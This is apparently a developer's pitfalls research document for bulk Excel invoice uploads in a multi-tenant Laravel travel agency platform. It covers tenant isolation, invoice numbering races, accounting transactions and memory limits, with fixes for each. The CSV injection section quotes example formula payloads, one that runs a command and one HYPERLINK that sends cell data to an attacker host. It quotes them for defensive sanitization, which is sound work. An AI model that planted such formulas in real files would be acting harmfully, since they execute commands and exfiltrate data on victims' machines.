# Pitfalls Research

**Domain:** Bulk Invoice Upload for Laravel Travel Agency Platform
**Researched:** 2026-02-12
**Confidence:** HIGH

## Critical Pitfalls

### Pitfall 1: Multi-Tenant Data Leakage via Missing company_id Isolation

**What goes wrong:**
When bulk uploading invoices, client matching by phone number alone can match clients from different companies, allowing Agent A from Company X to create invoices for Client B from Company Y. This is a critical security breach that violates tenant isolation.

**Why it happens:**
- Phone numbers are not unique in the database (only `company_id + civil_no` has unique constraint)
- Developers forget to add `company_id` to WHERE clauses when matching clients by phone
- Existing imports (ClientsImport, TasksImport) don't enforce company_id isolation
- Excel validation focuses on data type validation, not tenant isolation

**How to avoid:**
```php
// WRONG - matches any client with this phone
$client = Client::where('phone', $row['phone'])->first();

// CORRECT - enforces company isolation
$client = Client::where('company_id', $companyId)
    ->where('phone', $row['phone'])
    ->first();
```

**Warning signs:**
- Import classes missing `company_id` parameter in constructor
- No global scope enforcement on Client model for multi-tenancy
- Excel validation doesn't check if supplier_id exists FOR THIS COMPANY
- Preview shows clients from other companies

**Phase to address:**
Phase 1 (Validation & Preview) - Must validate company_id isolation BEFORE preview display

---

### Pitfall 2: Race Condition in Invoice Number Generation

**What goes wrong:**
When multiple Excel uploads happen simultaneously (or async queue workers process imports in parallel), `InvoiceSequence::firstOrCreate()` followed by manual increment creates duplicate invoice numbers. Invoice INV-2026-00042 gets created twice, violating business rules and causing accounting chaos.

**Why it happens:**
- Current invoice generation pattern (lines 366-371, 1281-1283 in InvoiceController):
```php
$invoiceSequence = InvoiceSequence::firstOrCreate(
    ['company_id' => $companyId],
    ['current_sequence' => 1]
);
$currentSequence = $invoiceSequence->current_sequence;
$invoiceNumber = $this->generateInvoiceNumber($currentSequence);
$invoiceSequence->current_sequence++;
$invoiceSequence->save();
```
- Gap between SELECT and UPDATE allows race conditions
- No atomic lock prevents concurrent access
- Bulk upload multiplies the risk (50 invoices = 50 sequence increments)

**How to avoid:**
Use Laravel's atomic locks or database-level atomic increment:

```php
// Option 1: Atomic increment (RECOMMENDED)
$currentSequence = InvoiceSequence::where('company_id', $companyId)
    ->lockForUpdate()
    ->first();
$invoiceNumber = $this->generateInvoiceNumber($currentSequence->current_sequence);
$currentSequence->increment('current_sequence');

// Option 2: Cache lock for entire bulk upload
use Illuminate\Support\Facades\Cache;

Cache::lock("invoice-upload-{$companyId}", 30)->block(30, function () use ($rows) {
    foreach ($rows as $row) {
        // Generate invoice with sequential numbers
    }
});

// Option 3: Dedicated queue worker for invoice creation
// In config/queue.php add dedicated queue:
'invoice-creation' => [
    'driver' => 'database',
    'queue' => 'invoice-creation',
    'retry_after' => 90,
],
// Single worker processes jobs sequentially
```

**Warning signs:**
- `duplicate entry` errors for invoice_number in logs
- Two invoices with same number in database
- Invoice sequence gaps or skipped numbers
- Concurrent API requests during upload testing

**Phase to address:**
Phase 1 (Validation & Preview) - Must lock sequence generation during preview
Phase 2 (Bulk Creation) - Must use atomic operations for actual creation

---

### Pitfall 3: Incomplete Transaction Rollback with Double-Entry Accounting

**What goes wrong:**
Bulk upload creates 50 invoices. Invoice #37 fails validation. Simple transaction rollback leaves orphaned journal entries, broken general ledger balances, and inconsistent accounting data. Auditors find $45,000 discrepancy that requires manual reconciliation.

**Why it happens:**
- Current InvoiceController uses transactions (line 849, 2648) BUT bulk import introduces NEW complexity
- Invoice creation triggers multiple side effects:
  - InvoiceDetail records
  - Transaction records
  - JournalEntry records (via addJournalEntry method, line 1292)
  - Credits/Debits to accounts
  - GeneralLedger updates
- Excel import default behavior: "entire import is automatically wrapped in a database transaction, meaning every error will rollback the entire import" BUT with batch inserts "only the current batch will be rolled back"
- Nested transactions don't work as expected in MySQL (only outer transaction matters)

**How to avoid:**
```php
// Use single transaction wrapping ENTIRE bulk upload
use Illuminate\Support\Facades\DB;

DB::transaction(function () use ($rows, $companyId) {
    foreach ($rows as $row) {
        // Validate row
        // Create invoice
        // Create invoice details
        // Create journal entries
        // All succeed or ALL fail
    }
}, 5); // 5 retry attempts

// DO NOT use batch inserts with WithBatchInserts concern
// It breaks transaction atomicity for accounting data

// Log transaction boundaries for debugging
Log::info('Starting bulk invoice transaction', ['row_count' => count($rows)]);
try {
    DB::transaction(function () { /* ... */ });
    Log::info('Bulk invoice transaction committed');
} catch (\Exception $e) {
    Log::error('Bulk invoice transaction rolled back', ['error' => $e->getMessage()]);
    throw $e;
}
```

**Warning signs:**
- Invoices exist but no corresponding journal entries
- GeneralLedger balance doesn't match invoice totals
- Transaction records orphaned (no invoice_id reference)
- "Integrity constraint violation" errors in logs
- Preview works but commit fails halfway

**Phase to address:**
Phase 2 (Bulk Creation) - Must wrap entire operation in single transaction
Phase 3 (Error Handling) - Must verify accounting integrity after rollback

---

### Pitfall 4: CSV Injection via Excel Formula Exploitation

**What goes wrong:**
Agent uploads Excel with task description `=CMD|'/C calc'!A0` or `=HYPERLINK("http://attacker.com/steal?data="&A1, "Click here")`. When accountant opens downloaded "error report" Excel, formulas execute, leaking sensitive client data or executing commands on their machine.

**Why it happens:**
- Current imports (TasksImport line 15-62, ClientsImport) directly use row values without sanitization
- Excel programs (Excel, LibreOffice, OpenOffice) auto-execute formulas starting with `=`, `+`, `-`, `@`, `|`
- HYPERLINK function doesn't prompt warnings, silently sends data to attacker
- Error reports/preview exports generate Excel files with unsanitized user input

**How to avoid:**
```php
// Sanitize ALL user input before storing or exporting
class InvoiceImport implements ToModel, WithValidation {

    protected function sanitizeFormulaInjection($value): string
    {
        if (!is_string($value)) {
            return $value;
        }

        // OWASP recommendation: prefix dangerous characters
        $dangerousChars = ['=', '+', '-', '@', '\t', '\r', '|'];

        if (in_array(substr($value, 0, 1), $dangerousChars)) {
            return "'" . $value; // Single quote prefix prevents execution
        }

        return $value;
    }

    public function model(array $row) {
        return new Invoice([
            'description' => $this->sanitizeFormulaInjection($row['description']),
            'notes' => $this->sanitizeFormulaInjection($row['notes']),
            // ... other fields
        ]);
    }
}

// When exporting error reports or previews
use Maatwebsite\Excel\Concerns\WithMapping;

class PreviewExport implements WithMapping {
    public function map($row): array {
        return [
            $this->sanitizeFormulaInjection($row->description),
            $this->sanitizeFormulaInjection($row->client_name),
            // ... other fields
        ];
    }
}
```

**Warning signs:**
- Task descriptions starting with `=`, `+`, `-`, `@`
- Excel warns "This file contains formulas" when opening previews
- Unexpected network requests when opening exported files
- Client complaints about "suspicious Excel behavior"

**Phase to address:**
Phase 1 (Validation & Preview) - Sanitize on upload AND preview export
Phase 3 (Error Handling) - Sanitize error report exports

---

### Pitfall 5: Memory Exhaustion on Large Excel Files

**What goes wrong:**
Agent uploads 5,000-row Excel file. Import starts, server hits 512MB PHP memory limit at row 2,847, crashes with "Allowed memory size exhausted" error. No invoices created, no clear error message to user, agent thinks upload succeeded.

**Why it happens:**
- PhpSpreadsheet (underlying library for Laravel-Excel) loads entire sheet into memory by default
- Each row creates multiple Eloquent models (Invoice, InvoiceDetail, Transaction, JournalEntry)
- Eager loading relationships multiplies memory usage
- No chunk reading or batch processing in current imports
- Current TasksImport loads ALL rows, creates ALL models in single operation

**How to avoid:**
```php
use Maatwebsite\Excel\Concerns\WithChunkReading;
use Maatwebsite\Excel\Concerns\WithBatchInserts;

class InvoiceImport implements ToModel, WithChunkReading, WithValidation {

    public function chunkSize(): int
    {
        return 100; // Process 100 rows at a time
    }

    // WARNING: Do NOT use WithBatchInserts for invoices
    // It breaks transaction atomicity needed for accounting

    // Instead, process in chunks but validate ALL before commit
    private $allRows = [];

    public function model(array $row) {
        // Store for validation, don't create yet
        $this->allRows[] = $row;
        return null; // Don't insert yet
    }

    public function __destruct() {
        // After all chunks loaded, validate ALL, then create ALL
        DB::transaction(function () {
            foreach ($this->allRows as $row) {
                // Create invoice + journal entries atomically
            }
        });
    }
}

// Set memory limit in controller
ini_set('memory_limit', '512M');

// Or queue large imports
use Maatwebsite\Excel\Concerns\WithQueue;

class InvoiceImport implements WithQueue, WithChunkReading {
    // Processes in background with chunked memory usage
}
```

**Warning signs:**
- Server logs show "PHP Fatal error: Allowed memory size"
- Import hangs/times out on files >1,000 rows
- Memory usage spikes during upload (monitor with `memory_get_peak_usage()`)
- Upload succeeds but creates 0 invoices

**Phase to address:**
Phase 1 (Validation & Preview) - Implement chunk reading for validation
Phase 2 (Bulk Creation) - Queue large imports (>500 rows)

---

### Pitfall 6: Client Matching Ambiguity with Non-Unique Phone Numbers

**What goes wrong:**
Excel contains phone "99887766". Database has TWO clients in same company with this phone (duplicate data from manual entry). Import matches Client A, creates invoice, but agent expected Client B. Invoice sent to wrong client, payment tracking breaks, refund chaos.

**Why it happens:**
- Phone field is NOT unique (no database constraint)
- Client model allows duplicates within company (only `company_id + civil_no` is unique)
- firstOrCreate() returns first match, not necessarily correct match
- No business rule enforcement for "one phone per company"
- Manual entry over years created duplicates

**How to avoid:**
```php
// Detect ambiguous matches during validation
class InvoiceImport implements WithValidation, ToModel {

    protected $validationErrors = [];

    public function model(array $row) {
        $companyId = auth()->user()->company_id;

        // Check for multiple matches
        $matchingClients = Client::where('company_id', $companyId)
            ->where('phone', $row['client_phone'])
            ->get();

        if ($matchingClients->count() > 1) {
            $this->validationErrors[] = [
                'row' => $row,
                'error' => "Ambiguous client: {$matchingClients->count()} clients found with phone {$row['client_phone']}",
                'clients' => $matchingClients->pluck('name', 'id')->toArray(),
            ];
            return null; // Flag for manual review
        }

        if ($matchingClients->count() === 0) {
            $this->validationErrors[] = [
                'row' => $row,
                'error' => "Unknown client: No client found with phone {$row['client_phone']}",
                'action' => 'manual_review',
            ];
            return null;
        }

        $client = $matchingClients->first();

        // Additional verification: check if name matches
        if (isset($row['client_name'])) {
            $similarity = similar_text(
                strtolower($client->name),
                strtolower($row['client_name'])
            );
            if ($similarity < 70) { // Less than 70% match
                $this->validationErrors[] = [
                    'row' => $row,
                    'warning' => "Name mismatch: Excel '{$row['client_name']}' vs DB '{$client->name}'",
                    'client_id' => $client->id,
                ];
            }
        }

        return $client;
    }
}

// Show ambiguous matches in preview UI
// Require agent to select correct client or fix duplicates first
```

**Warning signs:**
- Preview shows unexpected client names
- Agent reports "wrong client on invoice"
- Multiple clients with same phone in database
- Preview confidence score low

**Phase to address:**
Phase 1 (Validation & Preview) - Detect and flag ambiguous matches
Phase 2 (Manual Review Queue) - Allow agent to resolve ambiguity

---

### Pitfall 7: Timeout on Slow Journal Entry Creation

**What goes wrong:**
Bulk upload of 200 invoices starts. Each invoice triggers `addJournalEntry()` method (line 1292 in InvoiceController) which creates Transaction + multiple JournalEntry records. At invoice #127, PHP max_execution_time of 60 seconds expires. Request times out, partial data committed (if not in transaction), agent sees white screen.

**Why it happens:**
- Journal entry creation is synchronous and slow:
  - Query Account balances
  - Create Transaction record
  - Create JournalEntry debit
  - Create JournalEntry credit
  - Update GeneralLedger
  - Repeat for each task in invoice
- 200 invoices × 5 tasks avg × 4 DB queries = 4,000 queries
- No progress feedback to user
- Default PHP execution time too short for bulk operations

**How to avoid:**
```php
// Option 1: Queue journal entry creation
use Illuminate\Support\Facades\Bus;

class CreateBulkInvoices {
    public function handle($validatedRows) {
        DB::transaction(function () use ($validatedRows) {
            $jobs = [];

            foreach ($validatedRows as $clientPhone => $tasks) {
                // Create invoice quickly
                $invoice = Invoice::create([...]);

                // Queue journal entry creation
                $jobs[] = new CreateInvoiceJournalEntries($invoice->id);
            }

            // Dispatch jobs as batch
            Bus::batch($jobs)
                ->name('Bulk Invoice Journal Entries')
                ->dispatch();
        });
    }
}

// Option 2: Increase timeout for bulk uploads only
set_time_limit(300); // 5 minutes for bulk operations

// Option 3: Progressive processing with progress bar
// Process in batches of 10, update progress after each batch
foreach (array_chunk($validatedRows, 10) as $batch) {
    $this->processBatch($batch);
    event(new BulkUploadProgress($currentBatch, $totalBatches));
}

// Option 4: Optimize journal entry creation
// Use bulk inserts instead of individual creates
JournalEntry::insert($journalEntriesArray); // Much faster than loop of create()
```

**Warning signs:**
- "Maximum execution time exceeded" in logs
- Uploads work for <50 invoices, fail for >100
- Browser shows "Gateway Timeout" (504 error)
- Partial invoices created (some have journal entries, some don't)

**Phase to address:**
Phase 2 (Bulk Creation) - Queue journal entries OR optimize bulk insert
Phase 4 (User Feedback) - Show progress bar during upload

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip company_id validation during development | Faster prototyping | CRITICAL security breach in production | Never - Multi-tenant isolation is non-negotiable |
| Use firstOrCreate without locks for invoice numbers | Simple code | Duplicate invoice numbers, accounting chaos | Never - Atomic operations required |
| Skip CSV injection sanitization | Works fine locally | Data exfiltration, command execution on client machines | Never - Security requirement |
| Load all Excel rows into memory | Simple implementation | Memory exhaustion on large files | Only if file size limited to <500 rows with validation |
| Create journal entries synchronously | Immediate accounting consistency | Timeout on bulk uploads | Only for manual single invoice creation |
| Allow duplicate phone numbers in clients | Matches real-world data | Ambiguous client matching, wrong invoices | MUST handle gracefully with disambiguation UI |
| Skip transaction wrapping for speed | Faster imports | Orphaned accounting records, broken ledgers | Never - Accounting data requires ACID compliance |
| Auto-create unknown clients from Excel | Convenient for agents | Duplicate clients, data quality degradation | Never - Manual review required per requirements |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| N+1 queries in Excel validation | Validation takes 30+ seconds for 100 rows | Eager load relationships: `Client::with('agent', 'tasks')->whereIn('phone', $phones)->get()` | >50 rows |
| Loading entire Excel into memory | "Allowed memory size exhausted" errors | Use `WithChunkReading` concern, process 100 rows at a time | >1,000 rows or >10MB file |
| Sequential invoice number generation | Race conditions, duplicate numbers | Use `lockForUpdate()` or atomic increment | Multiple concurrent uploads |
| Synchronous journal entry creation | PHP timeout after 60 seconds | Queue journal entry jobs, use bulk inserts | >100 invoices in single upload |
| No database indexes on phone/company_id | Client matching query takes 5+ seconds | Add composite index: `index(['company_id', 'phone'])` | >10,000 clients |
| Eager loading all task relationships | Memory spikes during preview | Only load fields needed for preview: `select('id', 'description', 'amount')` | >500 tasks in preview |
| Creating PDF invoices during upload | Timeout, memory issues | Queue PDF generation as background job | >50 invoices |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Missing company_id in client lookup | **CRITICAL**: Cross-tenant data access, Company A sees Company B clients | Always include `where('company_id', $companyId)` in ALL queries |
| No file type validation | Malicious PHP file uploaded disguised as .xlsx | Validate MIME type: `$request->validate(['file' => 'required|mimes:xlsx,xls,csv'])` and check magic bytes |
| Trusting user-provided filenames | Path traversal attacks, file overwrites | Generate random filename: `$filename = uniqid() . '_' . time() . '.xlsx'` |
| Storing uploaded files in public directory | Direct web access to sensitive client data | Store in `storage/app/private/uploads/`, serve via controller with auth check |
| No CSRF protection on upload endpoint | Cross-site upload attacks | Ensure `@csrf` token in form, verify in controller |
| CSV injection (formulas in cells) | Command execution, data exfiltration | Prefix `=+-@\t\r\|` with single quote `'` before storing/exporting |
| No rate limiting on upload endpoint | Denial of service via spam uploads | Add throttle middleware: `Route::post('/upload')->middleware('throttle:5,1')` |
| Exposing company_id in Excel file | Information disclosure, enumeration attacks | Use internal IDs, not company_id in exported files |
| No authorization check for supplier access | Agent from Company A uses supplier from Company B | Verify supplier relationship: `$supplier->companies()->where('company_id', $companyId)->exists()` |
| SQL injection via Excel cell values | Database compromise | Use Eloquent ORM (NOT raw queries), parameterized queries only |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Generic "Upload failed" error | Agent doesn't know what to fix, retries same file | Show specific errors: "Row 12: Client phone '99887766' not found" with downloadable error report |
| No preview before commit | Agent uploads wrong file, creates 200 incorrect invoices | Always show preview with summary: "200 invoices for 45 clients, total KWD 125,400" |
| Validation after 5-minute upload | Wasted time, frustration | Validate file structure instantly, data validation in chunks with progress bar |
| No progress indication | Agent refreshes page, kills upload, uploads again | Show progress: "Processing row 127/500 (25%)" with estimated time remaining |
| Preview timeout after 2 minutes | Agent loses work, must re-upload | Store validation results in session/cache, allow resume |
| Ambiguous client match silently picks first | Wrong invoice created, discovered weeks later | Show disambiguation UI: "2 clients found: (1) John Smith - Civil 284... (2) John Smith - Civil 295..." |
| No undo after bulk upload | Agent creates 100 invoices by mistake, must delete manually | Provide "Undo bulk upload #12" button for 10 minutes after creation |
| Email flood to accountant | 50 invoice emails in 2 minutes, important ones lost | Send single summary email: "50 new invoices created" with PDF attachment or link |
| No draft/review state | Invoices immediately visible to clients via API | Create in "pending_review" status, require manual approval to activate |
| Excel column mapping required | Agent must match columns every upload | Auto-detect columns by header names, remember mapping per user |

## "Looks Done But Isn't" Checklist

- [ ] **Client Matching:** Often missing company_id isolation — verify query includes `where('company_id', $companyId)`
- [ ] **Invoice Number Generation:** Often missing atomic lock — verify `lockForUpdate()` or Cache lock used
- [ ] **Transaction Wrapping:** Often wraps individual invoice, not entire batch — verify single `DB::transaction()` around full upload
- [ ] **Journal Entry Creation:** Often creates entries but doesn't update GeneralLedger — verify ledger balance matches invoice totals
- [ ] **Supplier Validation:** Often checks supplier exists, not supplier-company relationship — verify `$supplier->companies()->where('company_id', $companyId)->exists()`
- [ ] **CSV Injection:** Often sanitizes on display, not on storage — verify sanitization happens in `model()` method before database insert
- [ ] **Error Reporting:** Often logs errors, doesn't show to user — verify downloadable error report with row numbers
- [ ] **Memory Management:** Often works on dev with 10 rows, fails on production with 1,000 — verify `WithChunkReading` implemented
- [ ] **Duplicate Detection:** Often checks duplicates within upload, not against existing database — verify query checks `Invoice::where('invoice_number', $number)->exists()`
- [ ] **Email Sending:** Often sends emails in loop, times out — verify emails queued as jobs, not sent synchronously
- [ ] **File Cleanup:** Often leaves uploaded files in storage forever — verify scheduled cleanup task or immediate deletion after processing
- [ ] **Authorization:** Often checks user can access upload page, not company_id match for resources — verify all resource queries filtered by `$companyId`

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Duplicate invoice numbers created | HIGH | 1. Identify duplicates: `SELECT invoice_number, COUNT(*) FROM invoices GROUP BY invoice_number HAVING COUNT(*) > 1`<br>2. Regenerate numbers for duplicates: Update with new sequential numbers<br>3. Update all references (invoice_partials, transactions, etc.)<br>4. Fix invoice_sequence table<br>5. Notify affected clients |
| Cross-tenant data access occurred | CRITICAL | 1. Audit logs: Find all affected records<br>2. Immediate rollback: Delete cross-tenant invoices<br>3. Notify affected companies (legal requirement)<br>4. Review all queries for missing company_id<br>5. Add database constraint to prevent future issues |
| Orphaned journal entries | MEDIUM | 1. Query: `SELECT * FROM journal_entries WHERE transaction_id NOT IN (SELECT id FROM transactions)`<br>2. Create reconciliation report<br>3. Delete orphaned entries OR create missing parent records<br>4. Rebalance general ledger<br>5. Run accounting verification script |
| Memory exhaustion crashed import | LOW | 1. Check logs for last processed row<br>2. If no transaction: Delete partial invoices created<br>3. If in transaction: No cleanup needed (auto-rolled back)<br>4. Re-upload with chunking enabled<br>5. Monitor memory during re-upload |
| CSV injection executed on accountant's machine | CRITICAL | 1. Incident response: Isolate affected machine<br>2. Audit: Check what formulas executed, what data sent where<br>3. Sanitize all existing data in database<br>4. Re-export all historical reports with sanitization<br>5. Security training for team |
| Wrong client matched (ambiguous phone) | MEDIUM | 1. Agent reports issue → Find invoice by number<br>2. Verify correct client from Excel source<br>3. Create reversal invoice for wrong client<br>4. Create correct invoice for right client<br>5. Notify both clients, update accounting<br>6. Add duplicate phone detection to prevent recurrence |
| Bulk upload timed out, partial data | HIGH | 1. Check transaction log: Was it atomic?<br>2. If partial commit: Query invoices created in last 5 minutes, delete ALL from batch<br>3. If rolled back: No cleanup needed<br>4. Verify journal entry integrity<br>5. Re-upload with timeout prevention (queue or chunks) |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Multi-tenant data leakage | Phase 1: Validation | Check preview doesn't show cross-company clients; Add test: Upload as Company A, verify can't match Company B clients |
| Invoice number race condition | Phase 1: Validation | Load test: 5 concurrent uploads, verify no duplicate invoice numbers in database |
| Incomplete transaction rollback | Phase 2: Bulk Creation | Fail test: Trigger validation error on row 50/100, verify ZERO invoices created and ZERO journal entries |
| CSV injection | Phase 1: Validation | Security test: Upload Excel with `=1+1` in description, verify stored as `'=1+1` (prefixed quote); Export preview, verify no formula execution |
| Memory exhaustion | Phase 1: Validation | Stress test: Upload 5,000-row file, monitor memory usage stays under 256MB |
| Client matching ambiguity | Phase 1: Validation + Phase 2: Manual Review | Test: Create 2 clients with same phone, upload invoice, verify manual review prompt shown |
| Journal entry timeout | Phase 2: Bulk Creation | Performance test: Upload 200 invoices, verify completes under 60 seconds OR queues successfully |

## Domain-Specific Anti-Patterns

### Anti-Pattern 1: Auto-Creating Clients from Excel

**What developers do:**
```php
// Tempting but WRONG
$client = Client::firstOrCreate([
    'phone' => $row['phone'],
    'company_id' => $companyId
], [
    'name' => $row['client_name'],
]);
```

**Why it's wrong:**
- Creates duplicate clients (phone not unique, data quality degrades)
- No civil_no validation (required for Kuwait travel agencies)
- No passport verification
- Violates requirements: "Cannot auto-create clients — Business rule to maintain data quality"

**Correct approach:**
```php
$client = Client::where('company_id', $companyId)
    ->where('phone', $row['phone'])
    ->first();

if (!$client) {
    $this->flagForManualReview($row, 'Unknown client');
    return null;
}
```

### Anti-Pattern 2: Batch Inserts for Invoice Creation

**What developers do:**
```php
// Fast but WRONG for invoices
use Maatwebsite\Excel\Concerns\WithBatchInserts;

class InvoiceImport implements WithBatchInserts {
    public function batchSize(): int {
        return 500; // Fast bulk insert!
    }
}
```

**Why it's wrong:**
- Skips Eloquent events (no journal entry creation)
- Breaks transaction atomicity (batch failures partial rollback)
- No invoice number sequence enforcement
- Bypasses model validation and business logic

**Correct approach:**
```php
// Slower but CORRECT - respects accounting integrity
DB::transaction(function () use ($rows) {
    foreach ($rows as $row) {
        $invoice = Invoice::create([...]); // Triggers events, journal entries
        // Full accounting integrity maintained
    }
});
```

### Anti-Pattern 3: Validating Row-by-Row Without Context

**What developers do:**
```php
public function rules(): array {
    return [
        'client_phone' => 'required|string',
        'amount' => 'required|numeric|min:0',
    ];
}
```

**Why it's wrong:**
- Can't validate "one invoice per client" rule (needs to see all rows)
- Can't check for duplicate tasks across rows
- Can't verify total amount matches sum of tasks
- Missing company_id context

**Correct approach:**
```php
// Two-phase validation
// Phase 1: Row-level validation
public function rules(): array { /* basic rules */ }

// Phase 2: Cross-row validation after all rows loaded
public function afterSheet(AfterSheet $event) {
    $rows = $event->sheet->toArray();

    // Group by client phone
    $invoiceGroups = collect($rows)->groupBy('client_phone');

    foreach ($invoiceGroups as $phone => $tasks) {
        $this->validateInvoiceGroup($phone, $tasks);
    }
}
```

## Sources

**Laravel Excel Documentation:**
- [Row Validation | Laravel Excel](https://docs.laravel-excel.com/3.1/imports/validation.html)
- [Chunk Reading | Laravel Excel](https://docs.laravel-excel.com/3.1/imports/chunk-reading.html)
- [Performance | Laravel Excel](https://docs.laravel-excel.com/4.x/exports/performance.html)

**Security:**
- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection)
- [CVE-2021-41270: Prevent CSV Injection via formulas (Symfony Blog)](https://symfony.com/blog/cve-2021-41270-prevent-csv-injection-via-formulas)

**Laravel Best Practices:**
- [How generate unique invoice number and avoid race condition | Laracasts](https://laracasts.com/discuss/channels/laravel/how-generate-unique-invoice-number-and-avoid-race-condition)
- [Create Guaranteed Unique Invoice Number in Laravel | TALL Stack Tips](https://talltips.novate.co.uk/laravel/create-guaranteed-unique-invoice-number-in-laravel)
- [Breaking Laravel's firstOrCreate using race conditions | freek.dev](https://freek.dev/1087-breaking-laravels-firstorcreate-using-race-conditions)
- [Database Transactions in Laravel for Data Integrity (2023) | Medium](https://medium.com/@prevailexcellent/database-transactions-in-laravel-for-data-integrity-a-comprehensive-guide-2023-50b54190d3a1)

**Excel Import Issues:**
- [Memory Issue with Importing Huge Excel File | GitHub Issue #2166](https://github.com/Maatwebsite/Laravel-Excel/issues/2166)
- [Prevent CSV Injection | GitHub Issue #978](https://github.com/Maatwebsite/Laravel-Excel/issues/978)
- [8 Tips Best Practice for Uploading Excel Data in Laravel | Medium](https://medium.com/@developerawam/8-tips-best-practice-for-uploading-excel-data-in-laravel-85050452ad42)

**Accounting Integration:**
- [Eloquent IFRS - Double Entry Accounting](https://github.com/ekmungai/eloquent-ifrs)
- [Abivia Ledger](https://ledger.abivia.com/)

**Multi-Tenant Security:**
- [Field-Ready Complete Guide: Multi-Tenant SaaS in Laravel](https://blog.greeden.me/en/2025/12/24/field-ready-complete-guide-designing-a-multi-tenant-saas-in-laravel-tenant-isolation-db-schema-row-domain-url-strategy-billing-authorization-auditing-performance-and-an-access/)

**Codebase Analysis:**
- `/home/soudshoja/soud-laravel/app/Imports/TasksImport.php` - Current import pattern (no company_id isolation, no validation)
- `/home/soudshoja/soud-laravel/app/Imports/ClientsImport.php` - Missing error handling and sanitization
- `/home/soudshoja/soud-laravel/app/Http/Controllers/InvoiceController.php` - Invoice creation with journal entries (lines 1171-1290), invoice number generation (lines 1977-1981)

---
*Pitfalls research for: Bulk Invoice Upload in Multi-Tenant Laravel Travel Agency Platform*
*Researched: 2026-02-12*
